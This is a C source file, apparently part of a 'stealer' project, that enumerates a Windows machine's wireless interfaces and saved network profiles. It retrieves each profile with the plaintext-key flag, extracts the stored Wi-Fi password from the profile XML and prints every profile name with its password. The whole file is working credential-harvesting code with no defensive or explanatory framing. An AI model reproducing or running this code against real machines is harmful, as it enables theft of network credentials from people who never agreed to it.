//#include "stealer.h"
#include <windows.h>
#include <wlanapi.h>

#include <tchar.h>
#include <msxml2.h>
#include <stdio.h>


#define WLAN_API_VERSION_2 2

HANDLE open_wlan_handle(DWORD api_version) {
    
    DWORD negotiatedVersion = 0;
    HANDLE cliendHandle = INVALID_HANDLE_VALUE;

    DWORD result = WlanOpenHandle(api_version, NULL, &negotiatedVersion, &cliendHandle);
    
    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error openning WlanHandle", "Error Popup", MB_OK | MB_ICONWARNING);
        return INVALID_HANDLE_VALUE;
    }

    return cliendHandle;
}

PWLAN_INTERFACE_INFO_LIST enum_wlan_interfaces(HANDLE handle) {

    PWLAN_INTERFACE_INFO_LIST interfaceInfoList = NULL;
    DWORD result = WlanEnumInterfaces(handle, NULL, &interfaceInfoList);

    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error with enumerating interfaces", "Error Popup", MB_OK | MB_ICONWARNING);
        return NULL;
    }

    return interfaceInfoList;
}

PWLAN_PROFILE_INFO_LIST grab_interface_profiles(HANDLE handle, GUID interface_guid) {

    PWLAN_PROFILE_INFO_LIST profileList = NULL;
    DWORD result = WlanGetProfileList(handle, &interface_guid, NULL, &profileList);

    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error grabbing profiles", "Error popup", MB_OK | MB_ICONWARNING);
        return NULL;
    }

    return profileList;
}

BSTR extract_pass_from_xml(const BSTR xml_data) {

    CoInitialize(NULL);

    IXMLDOMDocument *xmlDoc = NULL;
    CoCreateInstance(&CLSID_DOMDocument,
                     NULL,
                     CLSCTX_INPROC_SERVER,
                     &IID_IXMLDOMDocument,
                     (void**)&xmlDoc);

    if (xmlDoc == NULL) {
        printf("Failed to create XML document.\n");
        return NULL;
    }

    VARIANT_BOOL isLoaded;
    xmlDoc->lpVtbl->loadXML(xmlDoc, xml_data, &isLoaded);
    if (isLoaded == VARIANT_FALSE) {
        printf("Failed to parse XML.\n");
        xmlDoc->lpVtbl->Release(xmlDoc);
        CoUninitialize();
        return NULL;
    }

    IXMLDOMNode *keyMaterialNode = NULL;
    xmlDoc->lpVtbl->selectSingleNode(xmlDoc,
                                    L"//sharedKey/keyMaterial",
                                    &keyMaterialNode);

    if (keyMaterialNode != NULL) {
        BSTR password;
        keyMaterialNode->lpVtbl->get_text(keyMaterialNode, &password);
        keyMaterialNode->lpVtbl->Release(keyMaterialNode);
        xmlDoc->lpVtbl->Release(xmlDoc);
        CoUninitialize();
        return password;
    }
    printf("Failed to parse XML.\n");

    xmlDoc->lpVtbl->Release(xmlDoc);
    CoUninitialize();
    return NULL;

}

void get_plain_text_pass(
    HANDLE handle,
    GUID interface_guid,
    LPCWSTR profile_name
) {

    LPWSTR profile_xml_data = NULL;
    DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;

    DWORD result = WlanGetProfile(
        handle,
        &interface_guid,
        profile_name,
        NULL,
        &profile_xml_data,
        &dwFlags,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        printf("Failed to retrieve XML data for profile: %ls\n", profile_name);
        return;
    }
    
    BSTR password = extract_pass_from_xml(profile_xml_data);
    if (password != NULL) {
        wprintf(L"Profile name: %ls, Password: %ls\n", profile_name, password);
        SysFreeString(password);
    } else {
        printf("Failed to extract password from XML.\n");
    }

    WlanFreeMemory(profile_xml_data);

}

int main() {

    HANDLE wlan_handle = open_wlan_handle(WLAN_API_VERSION_2);
    PWLAN_INTERFACE_INFO_LIST interface_ptr = enum_wlan_interfaces(wlan_handle);
    
    for (DWORD i = 0; i < interface_ptr->dwNumberOfItems; ++i) {
        WLAN_INTERFACE_INFO interface_info = interface_ptr->InterfaceInfo[i];

        PWLAN_PROFILE_INFO_LIST profile_list = grab_interface_profiles(wlan_handle, interface_info.InterfaceGuid);
        
        for (DWORD j = 0; j < profile_list->dwNumberOfItems; ++j) {
            WLAN_PROFILE_INFO profile_info = profile_list->ProfileInfo[j];
            //printf("\tProfile name: %ws\n", profile_info.strProfileName);
            get_plain_text_pass(wlan_handle, interface_info.InterfaceGuid, profile_info.strProfileName);
        }
        WlanFreeMemory(profile_list);
    }

    WlanFreeMemory(interface_ptr);

    WlanCloseHandle(wlan_handle, NULL);

    return EXIT_SUCCESS;
}
